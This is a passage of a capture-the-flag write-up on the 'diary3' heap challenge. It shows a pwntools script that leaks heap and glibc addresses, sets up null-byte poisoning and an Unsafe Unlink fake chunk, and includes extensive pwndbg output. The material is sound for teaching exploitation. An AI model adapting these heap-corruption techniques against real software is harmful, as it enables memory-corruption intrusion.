+<span class="mtk1">        </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">88</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'X'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (u64(</span><span class="mtk8">recount</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)[:</span><span class="mtk6">8</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">fffffffffffff000</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1000</span>  
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Heap base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">heap_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">88</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'Y'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">recount</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">7</span><span class="mtk1">)[:</span><span class="mtk6">8</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1e4d59</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span>()
+</code></pre></div><p>Since we have GDB attached to the process, we can verify that our base address are correct:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './diary3'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./'</span>
+[<span class="code-green">+</span>] Starting local process './diary3': pid 3602279
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './diary3', '3602279', '-x', '/tmp/pwn0e8inigl.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Heap base address: 0x55b818fab000
+[<span class="code-green">+</span>] Glibc base address: 0x7f191c93a000
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+2. edit dream
+3. delete dream
+4. recount dream
+5. exit diary
+&gt; <span class="code-red">$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vmmap
+LEGEND: <span class="code-dark-yellow">STACK</span> | <span class="code-dark-blue">HEAP</span> | <span class="code-dark-red">CODE</span> | <span class="code-dark-magenta">DATA</span> | <span class="mtku">RWX</span> | RODATA
+             Start                End Perm     Size Offset File
+    0x55b8183c9000     0x55b8183ca000 r--p     1000      0 ./diary3
+<span class="code-dark-red">    0x55b8183ca000     0x55b8183cb000 r-xp     1000   1000 ./diary3</span>
+    0x55b8183cb000     0x55b8183cc000 r--p     1000   2000 ./diary3
+    0x55b8183cc000     0x55b8183cd000 r--p     1000   2000 ./diary3
+<span class="code-dark-magenta">    0x55b8183cd000     0x55b8183d0000 rw-p     3000   3000 ./diary3</span>
+<span class="code-dark-blue">    0x55b818fab000     0x55b818fcc000 rw-p    21000      0 [heap]</span>
+    0x7f191c93a000     0x7f191c95f000 r--p    25000      0 ./libc.so.6
+<span class="code-dark-red">    0x7f191c95f000     0x7f191cad2000 r-xp   173000  25000 ./libc.so.6</span>
+    0x7f191cad2000     0x7f191cb1b000 r--p    49000 198000 ./libc.so.6
+    0x7f191cb1b000     0x7f191cb1e000 r--p     3000 1e0000 ./libc.so.6
+<span class="code-dark-magenta">    0x7f191cb1e000     0x7f191cb21000 rw-p     3000 1e3000 ./libc.so.6</span>
+<span class="code-dark-magenta">    0x7f191cb21000     0x7f191cb27000 rw-p     6000      0 [anon_7f191cb21]</span>  
+    0x7f191cb27000     0x7f191cb28000 r--p     1000      0 ./ld-2.29.so
+<span class="code-dark-red">    0x7f191cb28000     0x7f191cb49000 r-xp    21000   1000 ./ld-2.29.so</span>
+    0x7f191cb49000     0x7f191cb51000 r--p     8000  22000 ./ld-2.29.so
+    0x7f191cb51000     0x7f191cb52000 r--p     1000  29000 ./ld-2.29.so
+<span class="code-dark-magenta">    0x7f191cb52000     0x7f191cb53000 rw-p     1000  2a000 ./ld-2.29.so</span>
+<span class="code-dark-magenta">    0x7f191cb53000     0x7f191cb54000 rw-p     1000      0 [anon_7f191cb53]</span>
+<span class="code-dark-yellow">    0x7ffc73842000     0x7ffc73863000 rw-p    21000      0 [stack]</span>
+    0x7ffc73939000     0x7ffc7393c000 r--p     3000      0 [vvar]
+<span class="code-dark-red">    0x7ffc7393c000     0x7ffc7393d000 r-xp     1000      0 [vdso]</span>
+<span class="code-dark-red">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span>
+</code></pre></div><p>Everything is perfect.</p><h3 id="null-byte-poisoning">Null byte poisoning</h3><p>For this attack to work, we need to use at least chunks of size <code>0x100</code>, because we will overwrite the last byte with a null byte and want to keep a valid size. So, let&rsquo;s allocate two chunk and edit the top one to alter the size of the second chunk:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>  <span class="mtk3"># 9</span>
+<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'qwer'</span><span class="mtk1">)</span>  <span class="mtk3"># 10</span>  
+<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">9</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">)</span>
+</code></pre></div><p>We have this heap layout:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>heap
+<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x557ddf5ac000</span>
+Size: 0x251
+
+<span class="code-dark-green">Free chunk (tcachebins)</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x557ddf5ac250</span>
+Size: 0x411
+<span class="code-red">fd</span>: 0x00
+
+<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x557ddf5ac660</span>
+Size: 0x1011
+
+<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x557ddf5ad670</span>
+Size: 0x91
+
+...
+
+<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x557ddf5adaf0</span>
+Size: 0x91
+
+<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x557ddf5adb80</span>
+Size: 0x101
+
+<span class="code-dark-yellow">Allocated chunk</span>
+Addr: <span class="code-dark-blue">0x557ddf5adc80</span>
+Size: 0x100
+
+<span class="code-dark-red">Top chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x557ddf5add80</span>
+Size: 0x1f281
+
+<span class="code-red">pwndbg&gt; </span>x/50gx 0x557ddf5adb80
+<span class="code-dark-blue">0x557ddf5adb80</span>: 0x0000000000000000      0x0000000000000101  
+<span class="code-dark-blue">0x557ddf5adb90</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adba0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adbb0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adbc0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adbd0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adbe0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adbf0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adc00</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adc10</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adc20</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adc30</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adc40</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adc50</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adc60</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adc70</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x557ddf5adc80</span>: 0x4141414141414141      0x0000000000000100
+<span class="code-dark-blue">0x557ddf5adc90</span>: 0x0000000072657771      0x0000000000000000
+<span class="code-dark-blue">0x557ddf5adca0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557ddf5adcb0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557ddf5adcc0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557ddf5adcd0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557ddf5adce0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557ddf5adcf0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557ddf5add00</span>: 0x0000000000000000      0x0000000000000000
+</code></pre></div><p>As can be seen, the second chunk has the <code>PREV_INUSE</code> flag set to <code>0</code>. Once we free the chunk at the top, then if we free the bottom chunk the heap allocator will try to consolidate the heap and merge the two chunks. This is the point where the Unsafe Unlink exploit will be handy.</p><p>However, since this Glibc uses Tcache, first we need to fill the Tcache, so that the heap allocator enters the above two chunks in the Unsorted Bin and not in the Tcache free-list:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'Z'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">11</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">)</span>  
+</code></pre></div><p>We must add a fake chunk to perform the Unsafe Unlink expoit. I read about this technique in these resources:</p><ul><li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c">how2heap</a></li><li><a href="https://guyinatuxedo.github.io/30-unlink/unlink_explanation/index.html">Nightmare</a></li><li><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">heap-exploitation</a></li><li><a href="https://infosecwriteups.com/the-toddlers-introduction-to-heap-exploitation-unsafe-unlink-part-4-3-75e00e1b0c68">infosecwriteups</a></li></ul><p>With the above resources it might be clear what we want to achieve. We are trying to confuse the heap so that it consolidates the second chunk with a fake chunk that we have put in the data section of the chunk at the top. As a result, we will obtain overlapping chunks.</p><p>For the Unsafe Unlink to work, we need to satisfy some security checks that are explaned in the above links. After a lot of debugging, we come out with this code to enter the fake chunk and successfully perform the Unsafe Unlink exploit:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">holder_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">2490</span>
+<span class="mtk1">    </span><span class="mtk1">victim_chunk_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1b90</span>
+<span class="mtk1">    </span><span class="mtk1">fake_fd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">holder_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span>
+<span class="mtk1">    </span><span class="mtk1">fake_bk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">holder_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">10</span>
+
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">9</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">fake_fd</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">fake_bk</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">d0</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f0</span><span class="mtk1">))</span>  
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'Z'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">11</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, p64(</span><span class="mtk1">victim_chunk_addr</span><span class="mtk1">))</span>  <span class="mtk3"># 11</span>
+</code></pre></div><p>Notice that I entered a <code>0x20</code>-sized chunk to hold the address of the victim chunk to bypass security checks. Moreover, since <code>edit_dream</code> does not allow us to enter null bytes, we can free the chunk and allocate it again because <code>write_dreams</code> does allow null bytes. Notice that filling the Tcache is between the Unsafe Unlink setup.</p><p>Now, when calling <code>delete(p, 10)</code> we trigger <code>malloc_consolidate</code>. This is the heap layout before:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/50gx 0x563b8f3eab80
+<span class="code-dark-blue">0x563b8f3eab80</span>: 0x0000000000000000      0x0000000000000101  
+<span class="code-dark-blue">0x563b8f3eab90</span>: 0x0000000000000000      0x00000000000000f0
+<span class="code-dark-blue">0x563b8f3eaba0</span>: 0x0000563b8f3eb478      0x0000563b8f3eb480
+<span class="code-dark-blue">0x563b8f3eabb0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eabc0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eabd0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eabe0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eabf0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac00</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac10</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac20</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac30</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac40</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac50</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac60</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac70</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac80</span>: 0x00000000000000f0      0x0000000000000100
+<span class="code-dark-blue">0x563b8f3eac90</span>: 0x0000000072657771      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eaca0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacb0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacc0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacd0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eace0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacf0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3ead00</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>x/4gx 0x0000563b8f3eb478
+<span class="code-dark-blue">0x563b8f3eb478</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eb488</span>: 0x0000000000000021      0x0000563b8f3eab90
+<span class="code-red">pwndbg&gt; </span>x/gx 0x0000563b8f3eb478 + 0x18
+<span class="code-dark-blue">0x563b8f3eb490</span>: 0x0000563b8f3eab90
+<span class="code-red">pwndbg&gt; </span>x/gx 0x0000563b8f3eb480 + 0x10
+<span class="code-dark-blue">0x563b8f3eb490</span>: 0x0000563b8f3eab90
+<span class="code-red">pwndbg&gt; </span>continue
+Continuing.
+</code></pre></div><p>Notice that everything is prepared for the Unsafe Unlink exploit to work (fake size, fake previous size and right setup of <code>fd</code> and <code>bk</code> pointers).</p><p>Let&rsquo;s delete the chunk at index <code>10</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './diary3'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./'</span>
+[<span class="code-green">+</span>] Starting local process './diary3': pid 3625301
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './diary3', '3625301', '-x', '/tmp/pwng9cpqogc.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Heap base address: 0x563b8f3e9000
+[<span class="code-green">+</span>] Glibc base address: 0x7fa22c102000
+[<span class="code-blue">*</span>] Switching to interactive mode
+done
+1. write about dream
+2. edit dream
+3. delete dream
+4. recount dream
+5. exit diary
+&gt; <span class="code-red">$</span> 3
+index: <span class="code-red">$</span> 10
+diary page deleted
+1. write about dream
+2. edit dream
+3. delete dream
+4. recount dream
+5. exit diary
+&gt; <span class="code-red">$</span>
+</code></pre></div><p>Now the heap has changed a bit:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/50gx 0x563b8f3eab80
+<span class="code-dark-blue">0x563b8f3eab80</span>: 0x0000000000000000      0x0000000000000101
+<span class="code-dark-blue">0x563b8f3eab90</span>: 0x0000000000000000      0x00000000000001f1
+<span class="code-dark-blue">0x563b8f3eaba0</span>: 0x00007fa22c2e6ca0      0x00007fa22c2e6ca0
+<span class="code-dark-blue">0x563b8f3eabb0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eabc0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eabd0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eabe0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eabf0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac00</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac10</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac20</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac30</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac40</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac50</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac60</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac70</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac80</span>: 0x00000000000000f0      0x0000000000000100
+<span class="code-dark-blue">0x563b8f3eac90</span>: 0x0000000072657771      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eaca0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacb0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacc0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacd0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eace0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacf0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3ead00</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>bins
+<span class="code-dark-blue">tcachebins</span>
+<span class="code-dark-yellow">0x100 [  7]</span>: <span class="code-dark-blue">0x563b8f3ead90</span> —▸ <span class="code-dark-blue">0x563b8f3eae90</span> —▸ <span class="code-dark-blue">0x563b8f3eaf90</span> —▸ <span class="code-dark-blue">0x563b8f3eb090</span> —▸ <span class="code-dark-blue">0x563b8f3eb190</span> —▸ <span class="code-dark-blue">0x563b8f3eb290</span> —▸ <span class="code-dark-blue">0x563b8f3eb390</span> ◂— 0x0  
+<span class="code-dark-yellow">0x410 [  1]</span>: <span class="code-dark-blue">0x563b8f3e9260</span> ◂— 0x0
+<span class="code-dark-blue">fastbins</span>
+<span class="code-dark-yellow">empty</span>
+<span class="code-dark-blue">unsortedbin</span>
+<span class="code-dark-yellow">all</span>: <span class="code-dark-blue">0x563b8f3eab90</span> —▸ <span class="code-dark-magenta">0x7fa22c2e6ca0</span> ◂— 0x563b8f3eab90
+<span class="code-dark-blue">smallbins</span>
+<span class="code-dark-yellow">empty</span>
+<span class="code-dark-blue">largebins</span>
+<span class="code-dark-yellow">empty
+<span class="code-red">pwndbg&gt; </span>continue
+Continuing.
+</code></pre></div><p>As can be seen, we have an Unsorted Bin chunk inside another chunk (overlapping chunks). If we allocate a chunk of size <code>0x20</code> (for example), it will be placed there:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/50gx 0x563b8f3eab80
+<span class="code-dark-blue">0x563b8f3eab80</span>: 0x0000000000000000      0x0000000000000101  
+<span class="code-dark-blue">0x563b8f3eab90</span>: 0x0000000000000000      0x0000000000000021
+<span class="code-dark-blue">0x563b8f3eaba0</span>: 0x00007f0a66647361      0x00007fa22c2e6e80
+<span class="code-dark-blue">0x563b8f3eabb0</span>: 0x4141414141414141      0x00000000000001d1
+<span class="code-dark-blue">0x563b8f3eabc0</span>: 0x00007fa22c2e6ca0      0x00007fa22c2e6ca0
+<span class="code-dark-blue">0x563b8f3eabd0</span>: 0x4141414141414141      0x4141414141414141
